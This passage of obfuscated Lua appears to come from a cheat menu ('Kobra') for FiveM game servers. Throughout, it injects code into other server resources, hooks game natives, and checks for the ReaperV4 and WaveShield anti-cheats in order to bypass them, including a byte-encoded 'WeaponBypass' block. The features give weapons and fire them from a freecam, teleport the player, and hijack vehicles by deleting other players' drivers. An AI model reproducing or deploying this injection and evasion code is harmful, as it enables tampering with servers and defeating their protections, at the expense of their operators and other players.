                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v875   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1385=0 -0 ;local v1386;local v1387;local v1388;local v1389;local v1390;local v1391;local v1392;local v1393;while true do if (v1385==(2 -1)) then hNative("Wait",function(v1579,...) return v1579(...);end);hNative("PlayerPedId",function(v1580,...) return v1580(...);end);hNative("GetHashKey",function(v1581,...) return v1581(...);end);hNative("GiveWeaponToPed",function(v1582,...) return v1582(...);end);v1385=2 + 0 ;end if (v1385==(889 -(790 + 97))) then hNative("SetCurrentPedWeapon",function(v1583,...) return v1583(...);end);hNative("GetCurrentPedWeapon",function(v1584,...) return v1584(...);end);hNative("RemoveWeaponFromPed",function(v1585,...) return;end);v1387=GetCamCoord(_G.KobraFreecamObject);v1385=13 -10 ;end if (v1385==4) then v1392=PlayerPedId();v1393=GetHashKey(v875);GiveWeaponToPed(v1392,v1393,75 + 180 ,false,true);MachoInjectThread(0 + 0 ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1393   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );v1385=5;end if (v1385==(245 -(235 + 10))) then v1386=nil;function v1386(v1586) local v1587=0 + 0 ;local v1588;local v1589;local v1590;while true do if (v1587==(1 -0)) then v1590=math.abs(math.cos(v1589));return vector3( -math.sin(v1588) * v1590 ,math.cos(v1588) * v1590 ,math.sin(v1589));end if (v1587==(1183 -(887 + 296))) then v1588=math.rad(v1586.z);v1589=math.rad(v1586.x);v1587=1046 -(512 + 533) ;end end end function hNative(v1591,v1592) local v1593=1424 -(662 + 762) ;local v1594;while true do if (v1593==(677 -(334 + 343))) then v1594=_G[v1591];if ( not v1594 or (type(v1594)~="function")) then return;end v1593=1;end if (v1593==(3 -2)) then _G[v1591]=function(...) return v1592(v1594,...);end;break;end end end hNative("CreateThread",function(v1595,...) return v1595(...);end);v1385=490 -(198 + 291) ;end if (v1385==(1 + 4)) then Wait(824 -(141 + 433) );ShootSingleBulletBetweenCoords(v1387.x,v1387.y,v1387.z,v1391.x,v1391.y,v1391.z,100,true,v1393,v1392,true,false,100000);break;end if (v1385==3) then v1388=GetCamRot(_G.KobraFreecamObject,9 -7 );v1389=v1386(v1388);v1390=550 + 450 ;v1391=v1387 + (v1389 * v1390) ;v1385=781 -(227 + 550) ;end end end break;end if (v1004==(0 -0)) then v21=v875;print(("weapon: %s, LastWeaponFired: %s"):format(v875,v21));v1004=2 -1 ;end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then print("Toogie Doogie");local function v1325(v1394) local v1395=0;local v1396;local v1397;local v1398;while true do if (v1395==(104 -(72 + 31))) then v1398=math.abs(math.cos(v1397));return vector3( -math.sin(v1396) * v1398 ,math.cos(v1396) * v1398 ,math.sin(v1397));end if ((348 -(89 + 259))==v1395) then v1396=math.rad(v1394.z);v1397=math.rad(v1394.x);v1395=1 + 0 ;end end end function hNative(v1399,v1400) local v1401=0 + 0 ;local v1402;while true do if (v1401==(0 + 0)) then v1402=_G[v1399];if ( not v1402 or (type(v1402)~="function")) then return;end v1401=1;end if (v1401==(1 -0)) then _G[v1399]=function(...) return v1400(v1402,...);end;break;end end end hNative("CreateThread",function(v1403,...) return v1403(...);end);hNative("Wait",function(v1404,...) return v1404(...);end);hNative("PlayerPedId",function(v1405,...) return v1405(...);end);hNative("GetHashKey",function(v1406,...) return v1406(...);end);hNative("GiveWeaponToPed",function(v1407,...) return v1407(...);end);hNative("SetCurrentPedWeapon",function(v1408,...) return v1408(...);end);hNative("GetCurrentPedWeapon",function(v1409,...) return v1409(...);end);hNative("RemoveWeaponFromPed",function(v1410,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1411,...) return v1411(...);end);local v1326=GetCamCoord(_G.KobraFreecamObject);local v1327=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1328=v1325(v1327);local v1329=2040 -1040 ;local v1330=v1326 + (v1328 * v1329) ;local v1331=PlayerPedId();local v1332=GetHashKey(v875);local function v1333(v1412) local v1413=0;local v1414;while true do if (v1413==(1403 -(1333 + 70))) then v1414={};for v1596=1833 -(701 + 1131) , #v1412 do v1414[v1596]=string.byte(v1412,v1596);end v1413=128 -(55 + 72) ;end if (v1413==(157 -(99 + 57))) then return table.concat(v1414,",");end end end local v1334=v1333(v875);v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1331,v1334));Wait(251 -101 );ShootSingleBulletBetweenCoords(v1326.x,v1326.y,v1326.z,v1330.x,v1330.y,v1330.z,100,true,v1332,v1331,true,false,52022 + 47978 );end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v875   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1258=1579 -(1243 + 336) ;local v1259;local v1260;local v1261;local v1262;local v1263;local v1264;local v1265;local v1266;while true do if (v1258==2) then hNative("GetHashKey",function(v1430,...) return v1430(...);end);hNative("GiveWeaponToPed",function(v1431,...) return v1431(...);end);hNative("SetCurrentPedWeapon",function(v1432,...) return v1432(...);end);v1258=1332 -(774 + 555) ;end if (3==v1258) then hNative("GetCurrentPedWeapon",function(v1433,...) return v1433(...);end);hNative("RemoveWeaponFromPed",function(v1434,...) return;end);v1260=GetCamCoord(_G.KobraFreecamObject);v1258=4;end if (v1258==1) then hNative("CreateThread",function(v1435,...) return v1435(...);end);hNative("Wait",function(v1436,...) return v1436(...);end);hNative("PlayerPedId",function(v1437,...) return v1437(...);end);v1258=2;end if (v1258==(3 + 3)) then GiveWeaponToPed(PlayerPedId(),v1266,1049 -(150 + 649) ,false,true);SetCurrentPedWeapon(PlayerPedId(),v1266,true);ShootSingleBulletBetweenCoords(v1260.x,v1260.y,v1260.z,v1264.x,v1264.y,v1264.z,100,true,v1266,v1265,true,false,100000);break;end if (v1258==(4 + 1)) then v1264=v1260 + (v1262 * v1263) ;v1265=PlayerPedId();v1266=GetHashKey(v875);v1258=8 -2 ;end if (v1258==(0 -0)) then v1259=nil;function v1259(v1438) local v1439=1984 -(1122 + 862) ;local v1440;local v1441;local v1442;while true do if (v1439==(1 -0)) then v1442=math.abs(math.cos(v1441));return vector3( -math.sin(v1440) * v1442 ,math.cos(v1440) * v1442 ,math.sin(v1441));end if (v1439==(0 + 0)) then v1440=math.rad(v1438.z);v1441=math.rad(v1438.x);v1439=1 -0 ;end end end function hNative(v1443,v1444) local v1445=0 + 0 ;local v1446;while true do if (v1445==0) then v1446=_G[v1443];if ( not v1446 or (type(v1446)~="function")) then return;end v1445=1 + 0 ;end if (v1445==1) then _G[v1443]=function(...) return v1444(v1446,...);end;break;end end end v1258=744 -(549 + 194) ;end if ((3 + 1)==v1258) then v1261=GetCamRot(_G.KobraFreecamObject,7 -5 );v1262=v1259(v1261);v1263=1000;v1258=5;end end end end end if IsDisabledControlJustPressed(0 + 0 ,37 -13 ) then local v775=v620;if (v775=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1267=0 + 0 ;local v1268;local v1269;local v1270;local v1271;local v1272;local v1273;local v1274;local v1275;local v1276;local v1277;local v1278;while true do if (v1267==(7 -5)) then v1272=2703 -(453 + 1250) ;v1273=v1269 + (v1271 * v1272) ;v1274=StartShapeTestRay(v1269.x,v1269.y,v1269.z,v1273.x,v1273.y,v1273.z, -1,PlayerPedId(),0 -0 );v1267=3;end if (v1267==1) then v1269=GetCamCoord(_G.KobraFreecamObject);v1270=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1271=v1268(v1270);v1267=577 -(203 + 372) ;end if (v1267==(0 + 0)) then v1268=nil;function v1268(v1447) local v1448=0 -0 ;local v1449;local v1450;local v1451;while true do if (v1448==(1382 -(978 + 404))) then v1449=math.rad(v1447.z);v1450=math.rad(v1447.x);v1448=3 -2 ;end if (v1448==(1 + 0)) then v1451=math.abs(math.cos(v1450));return vector3( -math.sin(v1449) * v1451 ,math.cos(v1449) * v1451 ,math.sin(v1450));end end end function GetEmptySeat(v1452) local v1453=318 -(56 + 262) ;local v1454;while true do if (v1453==(1 + 0)) then return  -(115 -(108 + 6));end if (v1453==0) then v1454={ -(1 + 0),1952 -(653 + 1299) ,1,4 -2 };for v1625,v1626 in ipairs(v1454) do if IsVehicleSeatFree(v1452,v1626) then return v1626;end end v1453=1;end end end v1267=1;end if (v1267==(1925 -(1042 + 880))) then v1275,v1276,v1277,v1275,v1278=GetShapeTestResult(v1274);if v1276 then if ((v1278~=(0 + 0)) and IsEntityAVehicle(v1278)) then local v1598=1002 -(16 + 986) ;local v1599;local v1600;local v1601;while true do if (v1598==0) then v1599=v1278;v1600=PlayerPedId();v1598=1;end if ((1219 -(700 + 518))==v1598) then v1601=GetEmptySeat(v1599);if (v1601== -1) then TaskWarpPedIntoVehicle(v1600,v1599, -1);elseif (v1601>=(0 -0)) then TaskWarpPedIntoVehicle(v1600,v1599,v1601);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end end else SetEntityCoords(PlayerPedId(),v1277.x,v1277.y,v1277.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1094=0;local v1095;local v1096;local v1097;local v1098;local v1099;local v1100;local v1101;local v1102;local v1103;local v1104;local v1105;while true do if (v1094==(1 -0)) then v1097=GetCamRot(_G.KobraFreecamObject,2);v1098=v1095(v1097);v1099=2511 -(617 + 894) ;v1100=v1096 + (v1098 * v1099) ;v1094=3 -1 ;end if (v1094==(458 -(271 + 187))) then v1095=nil;function v1095(v1335) local v1336=0;local v1337;local v1338;local v1339;while true do if ((1584 -(731 + 853))==v1336) then v1337=math.rad(v1335.z);v1338=math.rad(v1335.x);v1336=3 -2 ;end if (v1336==1) then v1339=math.abs(math.cos(v1338));return vector3( -math.sin(v1337) * v1339 ,math.cos(v1337) * v1339 ,math.sin(v1338));end end end function GetEmptySeat(v1340) local v1341=1521 -(199 + 1322) ;local v1342;while true do if (v1341==1) then return  -(1 -0);end if (v1341==(0 + 0)) then v1342={ -(1661 -(1291 + 369)),0 + 0 ,1,1 + 1 };for v1536,v1537 in ipairs(v1342) do if IsVehicleSeatFree(v1340,v1537) then return v1537;end end v1341=1;end end end v1096=GetCamCoord(_G.KobraFreecamObject);v1094=686 -(561 + 124) ;end if (v1094==(2 + 0)) then v1101=StartShapeTestRay(v1096.x,v1096.y,v1096.z,v1100.x,v1100.y,v1100.z, -1,PlayerPedId(),0);v1102,v1103,v1104,v1102,v1105=GetShapeTestResult(v1101);if v1103 then if ((v1105~=0) and IsEntityAVehicle(v1105)) then local v1522=853 -(25 + 828) ;local v1523;local v1524;local v1525;while true do if (v1522==(0 -0)) then v1523=v1105;v1524=PlayerPedId();v1522=1 -0 ;end if (v1522==(591 -(99 + 491))) then v1525=GetEmptySeat(v1523);if (v1525== -1) then TaskWarpPedIntoVehicle(v1524,v1523, -(49 -(18 + 30)));elseif (v1525>=0) then TaskWarpPedIntoVehicle(v1524,v1523,v1525);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end end else MachoInjectThread(0 -0 ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1104.x   .. [[, ]]   .. v1104.y   .. [[, ]]   .. v1104.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end end end elseif (v775=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1106=0;local v1107;while true do if (v1106==(0 -0)) then v1107=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v36(v1107,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1279=0;local v1280;local v1281;local v1282;local v1283;local v1284;local v1285;local v1286;local v1287;local v1288;local v1289;local v1290;local v1291;local v1292;local v1293;local v1294;while true do if (v1279==(11 -4)) then v1286=v1281(v1285);v1287=1000;v1288=v1284 + (v1286 * v1287) ;v1289=StartShapeTestRay(v1284.x,v1284.y,v1284.z,v1288.x,v1288.y,v1288.z, -(1 + 0),v1282,0);v1279=26 -18 ;end if (v1279==5) then function v1280(v1455,v1456) local v1457=0;local v1458;while true do if (v1457==(733 -(501 + 231))) then while (GetGameTimer() -v1458)<v1456  do local v1627=0;while true do if (v1627==(0 + 0)) then if NetworkHasControlOfEntity(v1455) then return true;end NetworkRequestControlOfEntity(v1455);v1627=1699 -(470 + 1228) ;end if ((1 + 0)==v1627) then Wait(0 + 0 );break;end end end return NetworkHasControlOfEntity(v1455);end if (v1457==(686 -(537 + 149))) then v1456=v1456 or (2432 -432) ;v1458=GetGameTimer();v1457=1;end end end v1281=nil;function v1281(v1459) local v1460=0 + 0 ;local v1461;local v1462;local v1463;while true do if (v1460==(0 -0)) then v1461=math.rad(v1459.z);v1462=math.rad(v1459.x);v1460=1;end if (1==v1460) then v1463=math.abs(math.cos(v1462));return vector3( -math.sin(v1461) * v1463 ,math.cos(v1461) * v1463 ,math.sin(v1462));end end end function GetEmptySeat(v1464) local v1465={ -(3 -2),0 + 0 ,1 + 0 ,2};for v1526,v1527 in ipairs(v1465) do if IsVehicleSeatFree(v1464,v1527) then return v1527;end end return  -1;end v1279=5 + 1 ;end if (v1279==(1 + 3)) then hNative("PlayerPedId",function(v1466,...) return v1466(...);end);hNative("NetworkRequestControlOfEntity",function(v1467,...) return v1467(...);end);hNative("NetworkHasControlOfEntity",function(v1468,...) return v1468(...);end);v1280=nil;v1279=4 + 1 ;end if (v1279==(4 -1)) then hNative("ClearPedTasksImmediately",function(v1469,...) return v1469(...);end);hNative("SetEntityCoordsNoOffset",function(v1470,...) return v1470(...);end);hNative("IsEntityAVehicle",function(v1471,...) return v1471(...);end);hNative("SetPedIntoVehicle",function(v1472,...) return v1472(...);end);v1279=2 + 2 ;end if (v1279==(581 -(134 + 445))) then hNative("GetShapeTestResult",function(v1473,...) return v1473(...);end);hNative("GetPedInVehicleSeat",function(v1474,...) return v1474(...);end);hNative("SetEntityVisible",function(v1475,...) return v1475(...);end);hNative("DeletePed",function(v1476,...) return v1476(...);end);v1279=5 -2 ;end if (v1279==8) then v1290,v1291,v1292,v1290,v1293=GetShapeTestResult(v1289);v1294=nil;function v1294(v1477) local v1478=0 + 0 ;local v1479;while true do if (v1478==(0 + 0)) then if ( not v1477 or  not DoesEntityExist(v1477)) then return;end v1479=GetPedInVehicleSeat(v1477, -(3 -2));v1478=1;end if (v1478==(261 -(36 + 224))) then if ((v1479~=(1860 -(1033 + 827))) and DoesEntityExist(v1479)) then SetPedIntoVehicle(v1282,v1477,0);v1280(v1477,3846 -(1002 + 844) );Wait(1360 -(1126 + 224) );for v1693=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1479   .. [[)
